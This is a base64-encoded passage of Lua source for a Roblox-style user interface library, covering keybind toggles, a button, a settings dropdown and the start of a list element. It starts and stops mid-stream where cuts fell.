zdHJpbmcoaW5wdXQpOmZpbmQoIkVudW0iKSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlucHV0ID0gaW5wdXQuTmFtZSA9PSAiRXNjYXBlIiBhbmQgIk5PTkUiIG9yIGlucHV0CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgY2ZnLmtleSA9IGlucHV0IG9yICJOT05FIgkKICAgICAgICAgICAgICAgIGVsc2VpZiBmaW5kKHsiVG9nZ2xlIiwgIkhvbGQiLCAiQWx3YXlzIn0sIGlucHV0KSB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlmIGlucHV0ID09ICJBbHdheXMiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5hY3RpdmUgPSB0cnVlIAogICAgICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICAgICAgY2ZnLm1vZGUgPSBpbnB1dAogICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfbW9kZShjZmcubW9kZSkgCiAgICAgICAgICAgICAgICBlbHNlaWYgdHlwZShpbnB1dCkgPT0gInRhYmxlIiB0aGVuIAogICAgICAgICAgICAgICAgICAgIGlucHV0LmtleSA9IHR5cGUoaW5wdXQua2V5KSA9PSAic3RyaW5nIiBhbmQgaW5wdXQua2V5IH49ICJOT05FIiBhbmQgbGlicmFyeTpjb252ZXJ0X2VudW0oaW5wdXQua2V5KSBvciBpbnB1dC5rZXkKICAgICAgICAgICAgICAgICAgICBpbnB1dC5rZXkgPSBpbnB1dC5rZXkgPT0gRW51bS5LZXlDb2RlLkVzY2FwZSBhbmQgIk5PTkUiIG9yIGlucHV0LmtleQoKICAgICAgICAgICAgICAgICAgICBjZmcua2V5ID0gaW5wdXQua2V5IG9yICJOT05FIgogICAgICAgICAgICAgICAgICAgIGNmZy5tb2RlID0gaW5wdXQubW9kZSBvciAiVG9nZ2xlIgoKICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dC5hY3RpdmUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjZmcuYWN0aXZlID0gaW5wdXQuYWN0aXZlCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGNmZy5zZXRfbW9kZShjZmcubW9kZSkgCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKGNmZy5hY3RpdmUpCgogICAgICAgICAgICAgICAgbG9jYWwgdGV4dCA9IHRvc3RyaW5nKGNmZy5rZXkpIH49ICJFbnVtcyIgYW5kIChrZXlzW2NmZy5rZXldIG9yIHRvc3RyaW5nKGNmZy5rZXkpOmdzdWIoIkVudW0uIiwgIiIpKSBvciBuaWwKICAgICAgICAgICAgICAgIGxvY2FsIF9fdGV4dCA9IHRleHQgYW5kICh0b3N0cmluZyh0ZXh0KTpnc3ViKCJLZXlDb2RlLiIsICIiKTpnc3ViKCJVc2VySW5wdXRUeXBlLiIsICIiKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJrZXkiIF0uVGV4dCA9IF9fdGV4dAoKICAgICAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHsKICAgICAgICAgICAgICAgICAgICBtb2RlID0gY2ZnLm1vZGUsCiAgICAgICAgICAgICAgICAgICAga2V5ID0gY2ZnLmtleSwgCiAgICAgICAgICAgICAgICAgICAgYWN0aXZlID0gY2ZnLmFjdGl2ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXRfdmlzaWJsZShib29sKQogICAgICAgICAgICAgICAgbG9jYWwgc2l6ZSA9IGJvb2wgYW5kIGNmZy55X3NpemUgb3IgMAogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImRyb3Bkb3duIiBdLCB7U2l6ZSA9IGRpbV9vZmZzZXQoaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXS5BYnNvbHV0ZVNpemUuWCwgc2l6ZSl9KQoKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZHJvcGRvd24iIF0uUG9zaXRpb24gPSBkaW1fb2Zmc2V0KGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCBpdGVtc1sgImtleWJpbmRfaG9sZGVyIiBdLkFic29sdXRlUG9zaXRpb24uWSArIGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uQWJzb2x1dGVTaXplLlkgKyA2MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgIGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKElucHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgaXRlbXNbICJrZXkiIF0uVGV4dCA9ICIuLi4iCQoKICAgICAgICAgICAgICAgIGNmZy5iaW5kaW5nID0gbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dEJlZ2FuLCBmdW5jdGlvbihrZXljb2RlLCBnYW1lX2V2ZW50KSAgCiAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChrZXljb2RlLktleUNvZGUgfj0gRW51bS5LZXlDb2RlLlVua25vd24gYW5kIGtleWNvZGUuS2V5Q29kZSBvciBrZXljb2RlLlVzZXJJbnB1dFR5cGUpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgY2ZnLmJpbmRpbmc6RGlzY29ubmVjdCgpIAogICAgICAgICAgICAgICAgICAgIGNmZy5iaW5kaW5nID0gbmlsCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF0uTW91c2VCdXR0b24yRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGNmZy5vcGVuID0gbm90IGNmZy5vcGVuIAoKICAgICAgICAgICAgICAgIGNmZy5zZXRfdmlzaWJsZShjZmcub3BlbikKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dEJlZ2FuLCBmdW5jdGlvbihpbnB1dCwgZ2FtZV9ldmVudCkgCiAgICAgICAgICAgICAgICBpZiBub3QgZ2FtZV9ldmVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2VsZWN0ZWRfa2V5ID0gaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuS2V5Ym9hcmQgYW5kIGlucHV0LktleUNvZGUgb3IgaW5wdXQuVXNlcklucHV0VHlwZQoKICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3RlZF9rZXkgPT0gY2ZnLmtleSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICBpZiBjZmcubW9kZSA9PSAiVG9nZ2xlIiB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLmFjdGl2ZSA9IG5vdCBjZmcuYWN0aXZlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KGNmZy5hY3RpdmUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBjZmcubW9kZSA9PSAiSG9sZCIgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5zZXQodHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSAgICAKCiAgICAgICAgICAgIGxpYnJhcnk6Y29ubmVjdGlvbih1aXMuSW5wdXRFbmRlZCwgZnVuY3Rpb24oaW5wdXQsIGdhbWVfZXZlbnQpIAogICAgICAgICAgICAgICAgaWYgZ2FtZV9ldmVudCB0aGVuIAogICAgICAgICAgICAgICAgICAgIHJldHVybiAKICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICBsb2NhbCBzZWxlY3RlZF9rZXkgPSBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCBhbmQgaW5wdXQuS2V5Q29kZSBvciBpbnB1dC5Vc2VySW5wdXRUeXBlCiAgICAKICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkX2tleSA9PSBjZmcua2V5IHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBjZmcubW9kZSA9PSAiSG9sZCIgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChmYWxzZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBjZmcuc2V0KHttb2RlID0gY2ZnLm1vZGUsIGFjdGl2ZSA9IGNmZy5hY3RpdmUsIGtleSA9IGNmZy5rZXl9KSAgICAgICAgICAgCiAgICAgICAgICAgIGNvbmZpZ19mbGFnc1tjZmcuZmxhZ10gPSBjZmcuc2V0CgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpidXR0b24ob3B0aW9ucykgCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG5hbWUgPSBvcHRpb25zLm5hbWUgb3IgIlRleHRCb3giLAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b25fZWxlbWVudCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiYnV0dG9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbl9lbGVtZW50IiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtNCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTgsIDAsIDMwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzMywgMzMsIDM1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCAzKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBjZmcubmFtZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgIm5hbWUiIF0sICJhY2NlbnQiLCAiQmFja2dyb3VuZENvbG9yMyIpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5jYWxsYmFjaygpCgogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXS5UZXh0Q29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgIm5hbWUiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpfSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6c2V0dGluZ3Mob3B0aW9ucykgIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBvcGVuID0gZmFsc2U7IAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsgCiAgICAgICAgICAgICAgICBzYW5pdHkgPSB0cnVlOyAtLSBtYWRlIHRoaXMgZm9yIG15IG93biBzYW5pdHkuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIGl0ZW1zWyAib3V0bGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFZpc2libGUgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnlbICJpdGVtcyIgXTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQ2xpcHNEZXNjZW5kYW50cyA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNSwgMjUsIDI5KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTY2FsZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIFNjYWxlID0gc2NhbGU7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBpdGVtc1sgImlubGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJlbGVtZW50cyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImlubGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMTAsIDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMjAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDE1KTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImVsZW1lbnRzIiBdCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZmFkZSIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInRpY2siIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkltYWdlQnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBJbWFnZSA9ICJyYnhhc3NldGlkOi8vMTI4Nzk3MjAwNDQyNjk4IjsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTYsIDAsIDE2KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnNldF92aXNpYmxlKGJvb2wpICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJvdXRsaW5lIiBdLCB7U2l6ZSA9IGRpbV9vZmZzZXQoYm9vbCBhbmQgMjQwIG9yIDAsIDApfSkKICAgICAgICAgICAgICAgIGl0ZW1zWyAib3V0bGluZSIgXS5Qb3NpdGlvbiA9IGRpbV9vZmZzZXQoaXRlbXNbICJ0aWNrIiBdLkFic29sdXRlUG9zaXRpb24uWCwgaXRlbXNbICJ0aWNrIiBdLkFic29sdXRlUG9zaXRpb24uWSArIDkwKQogICAgICAgICAgICAgICAgbGlicmFyeTpjbG9zZV9lbGVtZW50KGNmZykKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpdGVtc1sgInRpY2siIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5vcGVuID0gbm90IGNmZy5vcGVuCiAgICAgICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGNmZy5vcGVuKQogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6bGlzdChwcm9wZXJ0aWVzKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgICAgIG9wdGlvbnMgPSBwcm9wZXJ0aWVzLm9wdGlvbnMgb3IgeyIxIiwgIjIiLCAiMyJ9OwogICAgICAgICAgICAgICAgZmxhZyA9IHByb3BlcnRpZXMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpOyAgICAKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gcHJvcGVydGllcy5jYWxsYmFjayBvciBmdW5jdGlvbigpIGVuZDsKICAgICAgICAgICAgICAgIGRhdGFfc3RvcmUgPSB7fTsgICAgICAgIAogICAgICAgICAgICAgICAgY3VycmVudF9lbGVtZW50OwogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8KICAgICAgICAgICAgICAgIGl0ZW1zWyAibGlzdCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImxpc3QiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJsaXN0IiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA0KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5yZWZyZXNoX29wdGlvbnMob3B0aW9uc190b19yZWZyZXNoKQogICAgICAgICAgICAgICAgZm9yIF8sb3B0aW9uIGluIGNmZy5kYXRhX3N0b3JlIGRvIAogICAgICAgICAgICAgICAgICAgIG9wdGlvbjpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGZvciBfLCBvcHRpb25fZGF0YSBpbiBvcHRpb25zX3RvX3JlZnJlc2ggZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBidXR0b24gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3I